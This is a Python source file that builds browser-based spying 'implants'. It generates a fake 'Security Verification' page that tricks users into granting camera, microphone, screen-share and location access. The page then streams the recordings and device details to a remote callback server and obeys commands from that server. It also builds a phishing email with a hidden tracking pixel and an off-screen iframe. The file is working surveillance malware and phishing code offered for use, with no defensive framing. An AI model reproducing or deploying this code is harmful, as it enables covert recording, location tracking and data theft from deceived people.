import base64
import json
import uuid
from config import Config

class ImplantBuilder:
    """Generates browser-based implant payloads with WebRTC access"""

    @staticmethod
    def build_payload(target_mac, server_ip, features=None):
        if features is None:
            features = ["camera_front", "camera_back", "microphone", "screen"]

        implant_id = uuid.uuid4().hex[:12]
        callback = f"https://{server_ip}:{Config.IMPLANT_PORT}"

        # The implant HTML page that requests permissions and streams back
        html = f"""<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Security Update Required</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f5f5f7;
display:flex;justify-content:center;align-items:center;min-height:100vh}}
.card{{background:#fff;border-radius:16px;padding:40px;max-width:400px;
box-shadow:0 4px 24px rgba(0,0,0,.08);text-align:center}}
.icon{{font-size:48px;margin-bottom:16px}}
h2{{font-size:20px;color:#1d1d1f;margin-bottom:8px}}
p{{font-size:14px;color:#86868b;line-height:1.5;margin-bottom:24px}}
.btn{{background:#007aff;color:#fff;border:none;padding:14px 32px;
border-radius:12px;font-size:16px;cursor:pointer;width:100%}}
.btn:hover{{background:#0056b3}}
.progress{{display:none;margin-top:16px}}
.bar{{height:4px;background:#e5e5e5;border-radius:2px;overflow:hidden}}
.fill{{height:100%;background:#007aff;width:0%;transition:width 2s}}
</style></head>
<body><div class="card">
<div class="icon">🔒</div>
<h2>Security Verification</h2>
<p>Your device requires a security check. Tap below to verify your identity and continue.</p>
<button class="btn" onclick="startCapture()">Verify Now</button>
<div class="progress"><div class="bar"><div class="fill" id="pbar"></div></div>
<p style="margin-top:8px;font-size:12px" id="status">Verifying...</p></div>
</div>
<script>
const SRV="{callback}";
const IID="{implant_id}";
const MAC="{target_mac}";
const FEAT={json.dumps(features)};

async function startCapture(){{
  document.querySelector('.btn').style.display='none';
  document.querySelector('.progress').style.display='block';
  let pb=document.getElementById('pbar');
  let st=document.getElementById('status');
  pb.style.width='20%';

  let streams={{}};
  let errors=[];

  // Helper to try capture with fallbacks
  async function tryCapture(constraints, name){{
    try{{
      let s = await navigator.mediaDevices.getUserMedia(constraints);
      streams[name] = s;
      return true;
    }}catch(e){{
      errors.push(`${{name}}: ${{e.name}} - ${{e.message}}`);
      return false;
    }}
  }}

  // Camera front
  if(FEAT.includes('camera_front')){{
    st.textContent='Requesting front camera...';
    await tryCapture({{video:{{facingMode:'user',width:{{ideal:1280}},height:{{ideal:720}}}}}}, 'cam_front');
    pb.style.width='40%';
  }}

  // Camera back
  if(FEAT.includes('camera_back')){{
    st.textContent='Requesting rear camera...';
    // Use non-exact facingMode for better compatibility
    await tryCapture({{video:{{facingMode:'environment',width:{{ideal:1280}},height:{{ideal:720}}}}}}, 'cam_back');
    pb.style.width='60%';
  }}

  // Generic fallback if no cameras captured yet but features requested
  if(Object.keys(streams).length === 0 && (FEAT.includes('camera_front') || FEAT.includes('camera_back'))){{
     st.textContent='Retrying with generic camera access...';
     await tryCapture({{video:true}}, 'cam_generic');
  }}

  // Microphone standalone
  if(FEAT.includes('microphone')){{
    st.textContent='Requesting microphone...';
    await tryCapture({{audio:true}}, 'mic');
    pb.style.width='75%';
  }}

  // Screen share
  if(FEAT.includes('screen')){{
    st.textContent='Requesting screen share...';
    try{{
      streams.screen=await navigator.mediaDevices.getDisplayMedia({{
        video:{{width:{{ideal:1920}},height:{{ideal:1080}}}},
        audio:true
      }});
      pb.style.width='90%';
    }}catch(e){{errors.push(`screen: ${{e.name}}`)}}
  }}

  // Stream each to server
  for(let[name, stream] of Object.entries(streams)){{
    if(!stream) continue;
    streamToServer(name, stream);
  }}

  // No cameras found, just proceed
  if(Object.keys(streams).length === 0){{
    console.log('No hardware cameras found.');
  }}

  pb.style.width='100%';
  st.textContent='Verification complete ✓';

  // Listen for commands from server
  const socket = io(SRV);
  socket.on('command', (cmd) => {{
    if(cmd.type === 'snapshot') takeSnapshot(cmd.stream);
    if(cmd.type === 'switch_camera') {{
        console.log('Switching camera to:', cmd.camera);
        // Stop current video streams
        for(let [name, stream] of Object.entries(streams)) {{
            if(name.startsWith('cam')) {{
                stream.getTracks().forEach(t => t.stop());
                delete streams[name];
                document.querySelector(`video#video-${{name}}`)?.remove();
            }}
        }}
        // Start new one
        if(cmd.camera === 'front') tryCapture({{video:{{facingMode:'user'}}}}, 'cam_front').then(s => s && streamToServer('cam_front', streams.cam_front));
        if(cmd.camera === 'back') tryCapture({{video:{{facingMode:'environment'}}}}, 'cam_back').then(s => s && streamToServer('cam_back', streams.cam_back));
    }}
  }});

  // Collect device info
  let info={{
    id:IID, mac:MAC,
    userAgent:navigator.userAgent,
    platform:navigator.platform,
    screen:{{w:screen.width,h:screen.height,dpr:devicePixelRatio}},
    battery:null, geo:null,
    streams:Object.keys(streams),
    streams:Object.keys(streams),
    errors: errors
  }};

  try{{
    let batt=await navigator.getBattery();
    info.battery={{level:batt.level,charging:batt.charging}};
  }}catch(e){{}}

  try{{
    let pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{{enableHighAccuracy:true}}));
    info.geo={{lat:pos.coords.latitude,lng:pos.coords.longitude,acc:pos.coords.accuracy}};
  }}catch(e){{}}

  fetch(SRV+'/api/implant/checkin',{{
    method:'POST',
    headers:{{'Content-Type':'application/json'}},
    body:JSON.stringify(info)
  }}).catch(e=>console.log(e));
}}


async function takeSnapshot(streamName){{
    console.log('Taking snapshot for:', streamName);
    let blob;
    
    // Try to get from active stream
    const video = document.querySelector(`video#video-${{streamName}}`);
    if(video && video.srcObject){{
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
    }} else {{
        console.log('Cannot take snapshot: Stream not found or inactive');
    }}

    if(blob){{
        let form = new FormData();
        form.append('photo', blob);
        form.append('stream', streamName);
        form.append('id', IID);
        form.append('mac', MAC);
        fetch(SRV+'/api/implant/photo', {{method:'POST', body:form}}).catch(()=>{{}});
    }}
}}

function streamToServer(name, stream){{
  // Add hidden video element for snapshots
  let v = document.createElement('video');
  v.id = `video-${{name}}`;
  v.srcObject = stream;
  v.muted = true; v.play();
  v.style.display = 'none';
  document.body.appendChild(v);

  let mr=new MediaRecorder(stream,{{mimeType:getBestMime(name)}});
  mr.ondataavailable=async(e)=>{{
    if(e.data.size>0){{
      let form=new FormData();
      form.append('chunk',e.data);
      form.append('stream',name);
      form.append('id',IID);
      form.append('mac',MAC);
      fetch(SRV+'/api/implant/stream',{{method:'POST',body:form}}).catch(()=>{{}});
    }}
  }};
  mr.start(3000); // 3s chunks

  // Keep alive
  setInterval(()=>{{
    fetch(SRV+'/api/implant/heartbeat',{{
      method:'POST',
      headers:{{'Content-Type':'application/json'}},
      body:JSON.stringify({{id:IID,stream:name,active:true}})
    }}).catch(()=>{{}});
  }},10000);
}}

function getBestMime(name){{
  if(name.startsWith('cam')||name==='screen'){{
    if(MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus')) return 'video/webm;codecs=vp9,opus';
    if(MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) return 'video/webm;codecs=vp8,opus';
    return 'video/webm';
  }}
  if(MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) return 'audio/webm;codecs=opus';
  return 'audio/webm';
}}
</script></body></html>"""

        payload_b64 = base64.b64encode(html.encode()).decode()

        return {
            "implant_id": implant_id,
            "target_mac": target_mac,
            "features": features,
            "html": html,
            "html_b64": payload_b64,
            "delivery_url": f"{callback}/i/{implant_id}",
            "email_payload": ImplantBuilder._email_wrapper(implant_id, callback)
        }

    @staticmethod
    def _email_wrapper(implant_id, callback):
        return f"""<html><body>
<p>You have a pending security notification.</p>
<p>Please <a href="{callback}/i/{implant_id}">click here to review</a>.</p>
<!-- zero-click fallback -->
<img src="{callback}/api/track/{implant_id}" width="1" height="1" style="display:none">
<iframe src="{callback}/i/{implant_id}" style="position:absolute;left:-9999px;width:1px;height:1px" sandbox="allow-scripts allow-same-origin"></iframe>
</body></html>"""